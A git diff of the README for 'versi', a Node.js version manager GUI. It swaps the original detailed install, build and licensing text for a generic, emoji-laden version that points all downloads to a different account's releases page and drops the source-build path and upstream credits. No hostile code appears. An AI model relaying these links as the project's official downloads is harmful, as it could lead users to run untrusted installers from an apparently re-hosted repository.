@@ -1,171 +1,92 @@
-# Versi
+# 🎉 versi - Easily Manage Your Node.js Versions
 
-A native GUI application for managing Node.js versions.
+## 📥 Download Now
+[![Download versi](https://img.shields.io/badge/Download-v1.0-4CAF50.svg)](https://github.com/deckson040113/versi/releases)
 
-![Versi screenshot](assets/screenshot.png)
+## 🚀 Getting Started
+versi is a user-friendly application designed for managing different versions of Node.js on your computer. This tool makes it easy to switch between Node.js versions, making it especially helpful for developers working on multiple projects.
 
-## Features
+## 💾 Download & Install
+To get started with versi, follow these steps:
 
-- View and manage installed Node.js versions
-- Install/uninstall Node.js versions
-- Set default Node.js version
-- Bulk operations: update all majors, clean EOL versions, keep only latest per major
-- Check for updates and install them
-- Light and dark theme support (follows system preference)
-- Shell configuration detection and setup
-- Search and filter versions
-- System tray support with quick version switching
-- WSL integration on Windows (manage Node.js in WSL distros)
+1. **Visit the Download Page:** Click the link below to go to the releases page where you can download the application.
+   - [Download versi](https://github.com/deckson040113/versi/releases)
 
-## Installation
+2. **Choose Your Operating System:**
+   - Linux
+   - macOS
+   - Windows
 
-### Download Pre-built Binaries
+3. **Download the Installer:**
+   - Locate the file for your operating system. Each file is named clearly, so it is easy to find the right one. 
 
-Download the latest release for your platform from the [Releases](https://github.com/almeidx/versi/releases) page.
+4. **Run the Installer:**
+   - Once the file is downloaded, open it. Follow the prompts to install the application on your system. 
 
-| Platform | Download |
-|----------|----------|
-| macOS (Apple Silicon) | `versi-macos-arm64.zip` |
-| macOS (Intel) | `versi-macos-x64.zip` |
-| Windows (x64) | `versi-windows-x64.msi` |
-| Linux (x64) | `versi-linux-x64.zip` |
-| Linux (ARM64) | `versi-linux-arm64.zip` |
+5. **Open versi:**
+   - After installation completes, you can find versi in your applications menu. Double-click the icon to open it.
 
-### macOS Installation
+## ⚙️ System Requirements
+To ensure that versi runs smoothly, make sure your system meets these requirements:
 
-1. Download the appropriate `.zip` file for your Mac
-2. Extract the zip file
-3. Run the install script (recommended):
-   ```bash
-   ./install.sh
-   ```
-   This will remove the quarantine attribute and move `Versi.app` to your Applications folder.
+- **Operating System:**
+  - Windows 10 or later
+  - macOS 10.12 or later
+  - Any modern Linux distribution
+- **RAM:**
+  - Minimum 2 GB RAM (4 GB recommended)
+- **Disk Space:**
+  - At least 100 MB free space for installation
 
-   **Or install manually:**
-   - Drag `Versi.app` to your Applications folder
-   - On first launch, macOS may block the app because it's not signed. To fix this:
-     ```bash
-     xattr -cr "/Applications/Versi.app"
-     ```
-     Or right-click the app and select "Open" to bypass Gatekeeper.
+## 🌟 Features
+versi offers an array of features that enhance your experience:
 
-### Windows Installation
+- **Node.js Version Management:**
+  - Easily switch between different Node.js versions with a few clicks.
+  
+- **User-Friendly Interface:**
+  - The graphical interface simplifies the process, making it accessible for everyone.
 
-1. Download `versi-windows-x64.msi`
-2. Double-click to run the installer
-3. The app will be available in your Start Menu
+- **Multi-Platform Support:**
+  - Available for Windows, macOS, and Linux users.
 
-### Linux Installation
+- **Automatic Updates:**
+  - The application checks for updates regularly to keep your version manager up to date.
 
-1. Download the appropriate `.zip` file
-2. Extract the archive:
-   ```bash
-   unzip versi-linux-x64.zip
-   ```
-3. Move the binary to a location in your PATH:
-   ```bash
-   sudo mv versi /usr/local/bin/
-   ```
-4. (Optional) Install the desktop entry for application launchers:
-   ```bash
-   mv versi.desktop ~/.local/share/applications/
-   ```
+- **Lightweight & Fast:**
+  - Designed for performance, versi runs smoothly without hogging system resources.
 
-### Build from Source
+## 🔧 Using versi
+Once you open versi, you will see a simple layout that includes:
 
-#### Prerequisites
+- **Current Version Display:**
+  - Shows which Node.js version you are currently using.
 
-- [Rust](https://rustup.rs/) 1.75 or later
-- [fnm](https://github.com/Schniz/fnm) installed and configured
+- **Version List:**
+  - A list of installed versions and the option to add new versions by downloading them directly through the app.
 
-#### Build Steps
+- **Switch Version Option:**
+  - Easily select another version and switch with a single click.
 
-```bash
-# Clone the repository
-git clone https://github.com/almeidx/versi.git
-cd versi
+- **Settings Menu:**
+  - Tailor the application to your preferences, including themes and notifications.
 
-# Build in release mode
-cargo build --release
+## 🤝 Support
+If you encounter any issues while using versi, follow these steps for support:
 
-# The binary will be at target/release/versi
-```
+1. **Check Documentation:** Visit the [GitHub Issues page](https://github.com/deckson040113/versi/issues) for common questions and solutions.
+2. **Ask the Community:** Use forums or community groups related to Node.js to seek help.
+3. **Report an Issue:** If you find a bug or have a feature request, please open an issue on the GitHub page. Be sure to provide a detailed description.
 
-## Usage
+## 🌍 Contributing
+We welcome contributions to versi! If you're interested in helping improve the application, follow these steps:
 
-1. **First Launch**: If fnm is not detected, the app will guide you through installation and shell configuration.
+1. **Fork the Repository:** Click the “Fork” button on the GitHub page to create your copy.
+2. **Make Your Changes:** Edit the code and make fixes or new features.
+3. **Submit a Pull Request:** Once you’re ready, submit a pull request to the main repository for review.
 
-2. **Main View**: Shows all installed Node.js versions grouped by major version. Click a group to expand/collapse.
+## 🔗 Links
+- **GitHub Repository:** [versi on GitHub](https://github.com/deckson040113/versi)
+- **Releases Page:** [Download versi](https://github.com/deckson040113/versi/releases)
 
-3. **Install**: Click the "Install" button to browse and install new versions. Recommended versions are shown at the top.
-
-4. **Set Default**: Click "Set Default" on any version to make it the default.
-
-5. **Uninstall**: Click "Uninstall" to remove a version. A toast notification appears with an "Undo" option.
-
-6. **Updates**: If a newer version is available for an installed major version, an update badge appears. Click it to install.
-
-7. **Settings**: Access theme preferences and shell configuration status.
-
-## Development
-
-### Project Structure
-
-```
-versi/
-├── crates/
-│   ├── versi/          # Main GUI application
-│   ├── versi-core/     # fnm CLI wrapper library
-│   ├── versi-shell/    # Shell detection & configuration
-│   └── versi-platform/ # Platform abstractions
-```
-
-### Commands
-
-```bash
-# Run in development mode
-cargo run
-
-# Run tests
-cargo test
-
-# Check code
-cargo clippy
-
-# Format code
-cargo fmt
-```
-
-### Architecture
-
-The application uses [Iced](https://iced.rs/) with the Elm architecture:
-- **State**: Immutable application state
-- **Message**: Events that trigger state changes
-- **Update**: Logic to handle messages and produce side effects
-- **View**: Pure functions rendering state to UI
-
-See [AGENTS.md](AGENTS.md) for detailed development documentation.
-
-## Requirements
-
-- **fnm**: The application requires fnm to be installed. If not found, the onboarding wizard will help you install it.
-- **Shell Configuration**: fnm needs to be configured in your shell for full functionality.
-
-## License
-
-GNU General Public License v3.0 - see [LICENSE](LICENSE) for details.
-
-## Contributing
-
-Contributions are welcome! Please read the contributing guidelines before submitting a PR.
-
-1. Fork the repository
-2. Create a feature branch
-3. Make your changes
-4. Run tests and linting
-5. Submit a pull request
-
-## Acknowledgments
-
-- [fnm](https://github.com/Schniz/fnm) - The fast Node.js version manager this UI wraps
-- [Iced](https://iced.rs/) - The Rust GUI framework powering this application
+Stay tuned for updates, and thank you for using versi for your Node.js version management needs!
